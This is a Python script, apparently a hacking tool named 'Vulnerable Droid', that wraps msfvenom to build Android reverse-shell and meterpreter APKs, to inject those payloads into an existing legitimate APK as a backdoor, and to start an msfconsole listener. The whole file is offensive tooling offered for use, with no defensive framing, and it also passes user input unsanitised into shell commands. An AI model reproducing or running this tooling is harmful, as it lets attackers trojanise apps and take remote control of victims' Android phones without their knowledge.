import os
from time import sleep
import random

os.system("resize -s 43 132 > /dev/null")
os.system("clear")
if not os.path.isdir("./output"):
		os.makedirs("./output")
		print("[+] Creating [output] directory for resulting code files")

os.system("clear")
print ("""


██╗░░░██╗██╗░░░██╗██╗░░░░░███╗░░██╗███████╗██████╗░░█████╗░██████╗░██╗░░░░░███████╗
██║░░░██║██║░░░██║██║░░░░░████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔════╝
╚██╗░██╔╝██║░░░██║██║░░░░░██╔██╗██║█████╗░░██████╔╝███████║██████╦╝██║░░░░░█████╗░░
░╚████╔╝░██║░░░██║██║░░░░░██║╚████║██╔══╝░░██╔══██╗██╔══██║██╔══██╗██║░░░░░██╔══╝░░
░░╚██╔╝░░╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║██████╦╝███████╗███████╗
░░░╚═╝░░░░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝

██████╗░██████╗░░█████╗░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
██║░░██║██████╔╝██║░░██║██║██║░░██║
██║░░██║██╔══██╗██║░░██║██║██║░░██║
██████╔╝██║░░██║╚█████╔╝██║██████╔╝
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝╚═════╝░

Tool Coded by @Nikhil                                     Instagram:-https://www.instagram.com/iamnikhil2459
""")

sleep(1)

print("""



        ╔──────────────────────────────────────────────╗
        |             Vulnerable Droid                 |
        |      Hack & Remote android platform          |
        |         Tool Coded by @Nikhil                | 
        ┖──────────────────────────────────────────────┙
        [1] APK MSF                                     
        [2] BACKDOOR APK ORIGINAL (NEW)                 
        [3] START LISTENER                               
        [e] Exit                                        
""")

choice =input("Vulnerable Droid-->")
if choice == '1':

    print("""
    
   [1]android/meterpreter/reverse_tcp
   [2]android/shell/reverse_tcp
   [3]android/shell/reverse_http
   [4]android/shell/reverse_https
   [5]android/meterpreter/reverse_http
   [6]android/meterpreter/reverse_https
    
    """)
    payload =input("Vulnerable Droid ==>")
    if payload == '1':
        print("[+]Payload selected android/meterpreter/reverse_tcp")
        Lhost=input("Vulnerable Droid ++>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost)
        Lport=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport)
        Name=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name)

        payload = 'msfvenom -p android/meterpreter/reverse_tcp LHOST='+Lhost+' Lport='+Lport+' -o ./output/'+Name+'.apk'

        os.system(payload)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
        
    elif payload == '2':
        print("[+]Payload selected android/shell/reverse_tcp")
        Lhost1=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost1)
        Lport1=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport1)
        Name1=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name1)

        payload1 = 'msfvenom -p android/shell/reverse_tcp LHOST='+Lhost1+' Lport='+Lport1+' -o ./output/'+Name1+'.apk'

        os.system(payload1)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif payload == '3':
        print("[+]Payload selected android/shell/reverse_http")
        Lhost2=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost2)
        Lport2=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport2)
        Name2=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name2)

        payload2 = 'msfvenom -p android/shell/reverse_http LHOST='+Lhost2+' Lport='+Lport2+' -o ./output/'+Name2+'.apk'
        os.system(payload2)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif payload == '4':
        print("[+]Payload selected android/shell/reverse_https")
        Lhost3=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost3)
        Lport3=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport3)
        Name3=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name3)

        payload3 = 'msfvenom -p android/shell/reverse_https LHOST='+Lhost3+' Lport='+Lport3+' -o ./output/'+Name3+'.apk'
        os.system(payload3)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif payload == '5':
        print("[+]Payload selected android/meterpreter/reverse_http")
        Lhost4=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost4)
        Lport4=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport4)
        Name4=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name4)
        payload4 = 'msfvenom -p android/meterpreter/reverse_http LHOST='+Lhost4+' Lport='+Lport4+' -o ./output/'+Name4+'.apk'
        os.system(payload4)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif payload == '6':
        print("[+]Payload selected android/meterpreter/reverse_https")
        Lhost5=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost5)
        Lport5=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport5)
        Name5=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name5)
        payload5 = 'msfvenom -p android/meterpreter/reverse_https LHOST='+Lhost5+' Lport='+Lport5+' -o ./output/'+Name5+'.apk'
        os.system(payload5)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
##2 output
elif choice == '2':

    print ("""
    [1]android/meterpreter/reverse_tcp
    [2]android/shell/reverse_tcp
    [3]android/shell/reverse_http
    [4]android/shell/reverse_https
    [5]android/meterpreter/reverse_http
    [6]android/meterpreter/reverse_https
    """)

    lol =input("Vulnerable Droid==>")

    if lol == '1':
        print("[+]Payload selected android/meterpreter/reverse_tcp")
        Lhost20=input("Vulnerable Droid ++>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost20)
        Lport20=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport20)
        Name20=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name20)
        pwd =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd)

        lol1 = 'msfvenom -x '+pwd+' -p android/meterpreter/reverse_tcp LHOST='+Lhost20+' Lport='+Lport20+' -o ./output/'+Name20+'.apk'

        os.system(lol1)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
        
    elif lol == '2':
        print("[+]Payload selected android/shell/reverse_tcp")
        Lhost21=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost21)
        Lport21=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport21)
        Name21=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name21)
        pwd1 =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd1)

        lol1 = 'msfvenom -x '+pwd1+' -p android/shell/reverse_tcp LHOST='+Lhost21+' Lport='+Lport21+' -o ./output/'+Name21+'.apk'

        os.system(lol1)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif lol == '3':
        print("[+]Payload selected android/shell/reverse_http")
        Lhost22=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost22)
        Lport22=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport22)
        Name22=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name22)
        pwd2 =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd2)
        lol2 = 'msfvenom -x '+pwd2+' -p android/shell/reverse_http LHOST='+Lhost22+' Lport='+Lport22+' -o ./output/'+Name22+'.apk'
        os.system(lol2)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif lol == '4':
        print("[+]Payload selected android/shell/reverse_https")
        Lhost23=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost23)
        Lport23=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport23)
        Name23=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name23)
        pwd3 =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd3)

        lol3 = 'msfvenom -x '+pwd3+' -p android/shell/reverse_https LHOST='+Lhost23+' Lport='+Lport23+' -o ./output/'+Name23+'.apk'
        os.system(lol3)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif lol == '5':
        print("[+]Payload selected android/meterpreter/reverse_http")
        Lhost24=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost24)
        Lport24=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport24)
        Name24=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name24)
        pwd4 =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd4)
        lol4 = 'msfvenom -x '+pwd4+' -p android/meterpreter/reverse_http LHOST='+Lhost24+' Lport='+Lport24+' -o ./output/'+Name24+'.apk'
        os.system(lol4)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

    elif lol == '6':
        print("[+]Payload selected android/meterpreter/reverse_https")
        Lhost25=input("Vulnerable Droid ==>[LHOST]")
        print("[+]LHOST for Payload : " +Lhost25)
        Lport25=input("VulnerableDroid==>[Lport]")
        print("[+]LPORT for Payload : " +Lport25)
        Name25=input("VulnerableDroid==>[Name]")
        print("[+]NAME for Payload : "+Name25)
        pwd5 =input("Vulnerable Droid==>[Path to apk]")
        print("Path To Apk : "+pwd5)
        lol5 = 'msfvenom -x '+pwd5+' -p android/meterpreter/reverse_https LHOST='+Lhost25+' Lport='+Lport25+' -o ./output/'+Name25+'.apk'
        os.system(lol5)
        os.system("zenity --title '☢ VulnerableDroid ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")

if choice == '3':
    os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole'")

elif choice == 'e':

   os.system("service apache2 stop | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop apache2 service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
   os.system("service postgresql stop | zenity --progress --pulsate --title 'PLEASE WAIT...' --text='Stop postgresql service' --percentage=0 --auto-close --width 300 > /dev/null 2>&1")
   os.system("clear")
   print("Thanks For Using This tool :) Tool Coded by @Nikhil Hacker India")
   exit()

